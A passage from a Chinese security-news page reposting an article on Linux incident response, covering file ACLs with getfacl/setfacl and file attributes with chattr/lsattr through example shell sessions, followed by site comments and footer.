&quot;Microsoft YaHei&quot;;">0x11 文件权限</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">setfacl与getfacl</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ACL 全称 Access Control Lists 翻译成中文叫”访问控制列表”,传统的 Linux 文件系统的权限控制是通过 user、group、other 与 r(读)、w(写)、x(执行) 的不同组合来实现的。随着应用的发展，这些权限组合已不能适应现时复杂的文件系统权限控制要求。 例如，目录 /data 的权限为：drwxr-x—，所有者与所属组均为 root，在不改变所有者的前提下，要求用户 tom 对该目录有完全访问权限 (rwx).考虑以下2种办法 (这里假设 tom 不属于 root group)</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">(1) 给 /data 的 other 类别增加 rwx permission，这样由于 tom 会被归为 other 类别，那么他也将拥有 rwx 权限。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">(2) 将 tom 加入到 root group，为 root group 分配 rwx 权限，那么他也将拥有 rwx 权限。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">以上 2 种方法其实都不合适</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了解决这些问题，Linux 开发出了一套新的文件系统权限管理方法，叫文件访问控制列表 (Access Control Lists, ACL)。简单地来说，ACL 就是可以设置特定用户或者用户组对于一个文件的操作权限。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">文件的所有者以及有CAP_FOWNER的用户进程可以设置一个文件的acl。（在目前的linux系统上，root用户是唯一有CAP_FOWNER能力的用户）</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ACL 有两种:</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">access ACL</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">针对文件和目录设置访问控制列表。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一种是default ACL，只能针对目录设置。如果目录中的文件没有设置 ACL，它就会使用该目录的默认 ACL.</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）getfacl</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">获取文件权限</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@vincent&nbsp;tmp]#&nbsp;getfacl&nbsp;1.cap
#&nbsp;file:&nbsp;1.cap
#&nbsp;owner:&nbsp;root
#&nbsp;group:&nbsp;root
user::rw-
group::r--
other::r--</pre><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2）setfacl</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Access ACL</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">比如我设置/tmp/1.sh的other权限为000，然后切换到vinc账户。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[vinc@vincent&nbsp;tmp]$&nbsp;cat&nbsp;1.sh
cat:&nbsp;1.sh:&nbsp;权限不够</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后我们添加ACL</span></p><pre class="brush:bash;toolbar:false">[root@vincent&nbsp;opt]#&nbsp;setfacl&nbsp;-m&nbsp;u:vinc:rwx&nbsp;/tmp/1.sh</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后我们使用ll查看，发现第一个字段文件权限第十位变成了+号</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@vincent&nbsp;tmp]#&nbsp;ll&nbsp;1.sh
-rwxrwx---+&nbsp;1&nbsp;root&nbsp;root&nbsp;512&nbsp;8月&nbsp;&nbsp;&nbsp;9&nbsp;03:21&nbsp;1.sh</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后我们使用getfacl查看</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[vinc@vincent&nbsp;tmp]$&nbsp;getfacl&nbsp;1.sh
#&nbsp;file:&nbsp;1.sh
#&nbsp;owner:&nbsp;root
#&nbsp;group:&nbsp;root
user::rwx
user:vinc:rwx
group::r-x
mask::rwx
other::---</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们切换到vinc账户就可以查看内容了</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[vinc@vincent&nbsp;tmp]$&nbsp;cat&nbsp;1.sh
test</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">删除这条ACL</span></p><pre class="brush:bash;toolbar:false">[root@vincent&nbsp;tmp]#&nbsp;setfacl&nbsp;-x&nbsp;u:vinc&nbsp;/tmp/1.sh</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">取消所有的ACL</span></p><pre class="brush:bash;toolbar:false">[root@vincent&nbsp;tmp]#&nbsp;setfacl&nbsp;-b&nbsp;/tmp/1.sh</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Default ACl</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前面所说都是access acl，针对文件而言，而default acl是指对于一个目录进行default acl设置，并且在此目录下建立的文件都将继承此目录的acl。</span></p><pre class="brush:bash;toolbar:false">[root@vincent&nbsp;opt]#&nbsp;setfacl&nbsp;-d&nbsp;-m&nbsp;u:hehe:---&nbsp;1</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">来看下目录1的权限</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@vincent&nbsp;opt]#&nbsp;getfacl&nbsp;-c&nbsp;1
user::rwx
group::r-x
other::r-x
default:user::rwx
default:user:hehe:---
default:group::r-x
default:mask::r-x
default:other::r-x</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们在目录1下新建的文件都将继承这个权限。我们在目录1下新建一个文件，然后查看一下ACL</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[vinc@vincent&nbsp;1]$&nbsp;getfacl&nbsp;222
#&nbsp;file:&nbsp;222
#&nbsp;owner:&nbsp;vinc
#&nbsp;group:&nbsp;vinc
user::rw-
user:hehe:---
group::r-x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#effective:r--
mask::r--
other::r--</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">切换到hehe账户，查看文件，提示权限不够。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[hehe@vincent&nbsp;1]$&nbsp;cat&nbsp;/opt/1/222
cat:&nbsp;/opt/1/222:&nbsp;权限不够
lsattr和chattr
chattr</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">修改属性能够提高系统的安全 性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">s：保密性地删除文件或目录，即硬盘空间被全部收回。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例子：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">设置/etc/resolv.conf为不可修改</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@vincent&nbsp;tmp]#&nbsp;chattr&nbsp;+i&nbsp;/etc/resolv.conf&nbsp;
[root@vincent&nbsp;tmp]#&nbsp;lsattr&nbsp;/etc/resolv.conf&nbsp;
----i--------e-&nbsp;/etc/resolv.conf
[root@vincent&nbsp;tmp]#&nbsp;echo&nbsp;&quot;&quot;&nbsp;&gt;&nbsp;/etc/resolv.conf&nbsp;
-bash:&nbsp;/etc/resolv.conf:&nbsp;权限不够
lsattr</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">查看文件权限</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@vincent&nbsp;tmp]#&nbsp;lsattr&nbsp;1.txt&nbsp;
-----a-------e-&nbsp;1.txt</pre></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 阿里云先知<br/><a class="text-more" href="https://xianzhi.aliyun.com/forum/read/2150.html" target="_blank">原文链接：https://xianzhi.aliyun.com/forum/read/2150.html</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】Linux应急响应姿势浅谈 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="4481" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="e1e87c549d98349eb21e125dcd9d9ecb">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="16843" user-name="p4trick_st4r" href="javascript:;">
                p4trick_st4r            </a>
                        <span class="comment-time">2017-09-26 14:31:50</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16843">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16843" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">//@nU1I:转发微博</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/2x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="16842" user-name="_evil7" href="javascript:;">
                _evil7            </a>
                        <span class="comment-time">2017-09-26 14:11:50</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16842">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16842" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">mk</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4481" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4467.html" alt="【漏洞预警】SambaBleed：Samba信息泄露漏洞（CVE–2017–12163）预警" target="_blank">【漏洞预警】SambaBleed：Sa...</a></li>
                                <li><a href="/learning/detail/4473.html" alt="【技术分享】看我如何利用企业邮箱搞定上百企业内网或内部账号" target="_blank">【技术分享】看我如何利用企业邮箱搞...</a></li>
                                <li><a href="/learning/detail/4463.html" alt="【技术分享】利用DLL延迟加载实现远程代码注入 " target="_blank">【技术分享】利用DLL延迟加载实现...</a></li>
                                <li><a href="/learning/detail/4481.html" alt="【技术分享】Linux应急响应姿势浅谈" target="_blank">【技术分享】Linux应急响应姿势浅谈</a></li>
                                <li><a href="/learning/detail/4469.html" alt="【知识】9月24日 - 每日安全知识热点" target="_blank">【知识】9月24日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4472.html" alt="【技术分享】针对联网智能灯泡的安全性分析" target="_blank">【技术分享】针对联网智能灯泡的安全...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
